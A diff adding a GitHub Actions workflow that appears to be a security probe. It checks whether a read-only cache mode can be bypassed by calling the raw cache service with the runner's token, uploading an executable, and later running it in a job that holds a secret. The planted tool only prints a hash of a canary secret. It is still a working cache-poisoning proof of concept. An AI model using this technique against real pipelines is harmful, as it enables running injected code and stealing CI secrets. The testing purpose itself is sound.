@@ -1,0 +1,158 @@
+name: Cache mode service enforcement probe
+
+on:
+  workflow_dispatch:
+    inputs:
+      phase:
+        description: Probe raw write or consume the resulting cache
+        required: true
+        type: choice
+        options:
+          - probe
+          - consume
+      cache_key:
+        description: Unique exact cache key
+        required: true
+        type: string
+
+cache-mode: read
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    if: ${{ inputs.phase == 'probe' }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create harmless normal-client control
+        run: |
+          mkdir -p control-path
+          printf 'normal client should not save in read mode\n' > control-path/value.txt
+
+      - name: Normal cache client negative control
+        uses: actions/cache/save@v4
+        with:
+          path: control-path
+          key: ${{ inputs.cache_key }}-normal-control
+
+      - name: Try the same write through the raw v2 receiver
+        uses: actions/github-script@v8
+        env:
+          TEST_CACHE_KEY: ${{ inputs.cache_key }}
+        with:
+          script: |
+            const fs = require('fs')
+            const path = require('path')
+            const crypto = require('crypto')
+            const {execFileSync} = require('child_process')
+
+            const mode = process.env.ACTIONS_CACHE_MODE || ''
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
+            const key = process.env.TEST_CACHE_KEY || ''
+            if (!runtimeToken || !resultsUrl || !key) {
+              throw new Error('missing runtime capability or test key')
+            }
+
+            const version = crypto
+              .createHash('sha256')
+              .update('cache-bin|zstd-without-long|1.0')
+              .digest('hex')
+            const endpoint = new URL(
+              '/twirp/github.actions.results.api.v1.CacheService/',
+              resultsUrl
+            )
+            const request = async (method, body) => {
+              const response = await fetch(new URL(method, endpoint), {
+                method: 'POST',
+                headers: {
+                  authorization: `Bearer ${runtimeToken}`,
+                  'content-type': 'application/json'
+                },
+                body: JSON.stringify(body)
+              })
+              const text = await response.text()
+              let json = {}
+              try {
+                json = JSON.parse(text)
+              } catch {}
+              return {response, json}
+            }
+
+            const created = await request('CreateCacheEntry', {key, version})
+            const signedUploadUrl = created.json.signed_upload_url || ''
+            core.info(
+              `RAW_CREATE mode=${mode} status=${created.response.status} ok=${Boolean(created.json.ok)} signed_url_present=${Boolean(signedUploadUrl)} code=${created.json.code || ''} message=${created.json.msg || created.json.message || ''}`
+            )
+            if (!signedUploadUrl) {
+              core.notice('CACHE_MODE_RECEIVER_ENFORCED_READ_ONLY')
+              return
+            }
+
+            core.setSecret(signedUploadUrl)
+            const root = path.join(process.env.RUNNER_TEMP, `cache-mode-${Date.now()}`)
+            const payload = path.join(root, 'cache-bin')
+            fs.mkdirSync(payload, {recursive: true})
+            const toolPath = path.join(payload, 'tool')
+            fs.writeFileSync(toolPath, [
+              '#!/usr/bin/env bash',
+              'set -euo pipefail',
+              'hash="$(printf %s "${FUTURE_CANARY:-missing}" | sha256sum | cut -d" " -f1)"',
+              'printf "CACHE_MODE_BYPASS_EXECUTED canary_sha256=%s\\n" "$hash"'
+            ].join('\n') + '\n', {mode: 0o755})
+
+            const tarPath = path.join(root, 'cache.tar')
+            const archivePath = path.join(root, 'cache.tzst')
+            execFileSync('tar', ['--posix', '-cf', tarPath, '-C', root, 'cache-bin'])
+            execFileSync('zstd', ['-q', '-T0', '-f', tarPath, '-o', archivePath])
+            const archive = fs.readFileSync(archivePath)
+
+            const uploaded = await fetch(signedUploadUrl, {
+              method: 'PUT',
+              headers: {
+                'x-ms-blob-type': 'BlockBlob',
+                'x-ms-version': '2021-12-02',
+                'content-type': 'application/octet-stream'
+              },
+              body: archive
+            })
+            core.info(`RAW_UPLOAD status=${uploaded.status} size=${archive.length}`)
+            if (!uploaded.ok) {
+              throw new Error(`raw signed upload failed with HTTP ${uploaded.status}`)
+            }
+
+            const finalized = await request('FinalizeCacheEntryUpload', {
+              key,
+              size_bytes: String(archive.length),
+              version
+            })
+            core.info(
+              `RAW_FINALIZE status=${finalized.response.status} ok=${Boolean(finalized.json.ok)} entry_id_present=${Boolean(finalized.json.entry_id)} code=${finalized.json.code || ''} message=${finalized.json.msg || finalized.json.message || ''}`
+            )
+            if (!finalized.response.ok || !finalized.json.ok) {
+              throw new Error('raw cache finalization failed')
+            }
+            core.warning('CACHE_MODE_RAW_WRITE_ACCEPTED')
+
+  consume:
+    if: ${{ inputs.phase == 'consume' }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+
+      - name: Restore exact cache in a later job
+        id: cache
+        uses: actions/cache/restore@v4
+        with:
+          path: cache-bin
+          key: ${{ inputs.cache_key }}
+          fail-on-cache-miss: true
+
+      - name: Execute the restored tool
+        env:
+          FUTURE_CANARY: ${{ secrets.FUTURE_CANARY }}
+        run: |
+          test "${{ steps.cache.outputs.cache-hit }}" = "true"
+          test -x cache-bin/tool
+          ./cache-bin/tool
